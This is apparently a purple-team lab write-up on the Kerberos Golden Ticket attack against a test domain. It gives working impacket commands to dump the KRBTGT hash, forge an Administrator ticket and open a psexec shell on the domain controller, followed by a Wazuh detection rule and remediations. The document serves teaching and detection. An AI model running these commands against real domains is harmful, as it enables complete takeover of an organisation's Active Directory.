A Golden Ticket (T1558.001) is a **forged Kerberos TGT** signed with the **KRBTGT account's hash**. Since the KRBTGT account is used to sign all tickets in the domain, anyone with its hash can create a ticket for **any user, any group, any service**.

**Lab Setup**
This Attack Uses Artifacts obtained from prior DCSync Attack.
From Powershell:`Get-ADDomain | Select-Object DomainSID`
![Description](Screenshots/Get%20Domain%20SID.png)

From kali: `nxc ldap $IP -u "evil.user" -p "Password123" --get-sid`
![Description](Screenshots/Kali%20linux%20Netexec.png)

**Attack**

From Kali: Dumping the krbtgt service hashes.
`impacket-secretsdump redteam.local/dcreplicate:"Password123"@$IP | grep krbtgt`

Forging a Golden-Ticket.
`impacket-ticketer -aesKey $KEY$ -domain-sid $SID -domain redteam.local -user-id 500 Administrator`

Exporting the Ticket for later use.
`export KRB5CCNAME=Administrator.ccache`

Getting a shell as the Administrator user.
`impacket-psexec -k -no-pass -dc-ip $IP redteam.local/Administrator@AD-DC01.redteam.local`
![Description](Screenshots/Kali%20linux%20impacket.png)


**Detection**

Custom Wazuh Rule
```xml
<rule id="100013" level="15">
  <if_sid>60103</if_sid>
  <field name="win.system.eventID">^4769$</field>
  <field name="win.eventdata.ticketEncryptionType">^0x12$</field>
  <field name="win.eventdata.ticketOptions">^0x40810010$</field>
  <description>Possible Golden Ticket forged TGS detected from $(win.eventdata.ipAddress)</description>
  <mitre>
    <id>T1558.001</id>
  </mitre>
</rule>
```

Wazuh Detection
![Description](Screenshots/Wazuh%20Detection.png)

| Field                  | Value                         | Meaning                 |
| ---------------------- | ----------------------------- | ----------------------- |
| `targetUserName`       | `Administrator@REDTEAM.LOCAL` | Forged ticket for DA    |
| `serviceName`          | `AD-DC01$`                    | Accessing the DC        |
| `ticketEncryptionType` | `0x12`                        | AES256                  |
| `ticketOptions`        | `0x40810010`                  | Golden Ticket flags     |
| `ipAddress`            | `::ffff:192.168.46.128`       | Kali machine            |
| `status`               | `0x0`                         | Success                 |
| `eventID`              | `4769`                        | Kerberos service ticket |


**Remediations** 

| Privileged Account Management | Limit domain admin account permissions to domain controllers and limited servers. Delegate other admin functions to separate accounts. |
| ----------------------------- | -------------------------------------------------------------------------------------------------------------------------------------- |
| KRBTGT Password Reset         | Reset the KRBTGT Password twice to invalidate all golden tickets.                                                                      |
| Protecting DCSync Rights      | Golden Ticket requires the KRBTGT hash which is obtained via DCSync preventing DCSync prevents Golden Ticket                           |
